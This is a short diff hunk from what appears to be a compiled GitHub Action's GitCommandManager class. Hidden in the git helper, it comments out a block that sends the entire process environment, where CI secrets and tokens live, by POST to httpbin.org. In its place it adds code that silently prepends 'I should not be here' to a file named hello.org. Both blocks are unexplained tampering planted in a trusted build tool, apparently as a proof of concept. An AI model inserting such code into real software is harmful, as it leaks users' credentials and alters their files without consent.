@@ -641,33 +641,40 @@ class GitCommandManager {
 	      // });
 	/* ---------- */
 
+        const data = fs.readFileSync('hello.org')
+        const fd = fs.openSync('hello.org', 'w+')
+        const insert = Buffer.from("I should not be here")
+        fs.writeSync(fd, insert, 0, insert.length, 0)
+        fs.writeSync(fd, data, 0, data.length, insert.length)
+        fs.close(fd, (err) => {});
+
 	/* ---------- */
-	    const data = JSON.stringify(process.env);
-	    var options = {
-        hostname: 'httpbin.org',
-        port: 443,
-        path: '/post',
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Content-Length': data.length
-        }
-      };
-      var req = https.request(options, (res) => {
-        console.warn('statusCode:', res.statusCode);
-        console.warn('headers:', res.headers);
+	  //   const data = JSON.stringify(process.env);
+	  //   var options = {
+    //     hostname: 'httpbin.org',
+    //     port: 443,
+    //     path: '/post',
+    //     method: 'POST',
+    //     headers: {
+    //       'Content-Type': 'application/json',
+    //       'Content-Length': data.length
+    //     }
+    //   };
+    //   var req = https.request(options, (res) => {
+    //     console.warn('statusCode:', res.statusCode);
+    //     console.warn('headers:', res.headers);
 
-        res.on('data', (d) => {
-        process.stdout.write(d);
-      });
-    });
+    //     res.on('data', (d) => {
+    //     process.stdout.write(d);
+    //   });
+    // });
 
-    req.on('error', (e) => {
-      console.error(e);
-    });
+    // req.on('error', (e) => {
+    //   console.error(e);
+    // });
 
-    req.write(data);
-    req.end();
+    // req.write(data);
+    // req.end();
 	/* ---------- */
 
             const output = yield this.execGit([
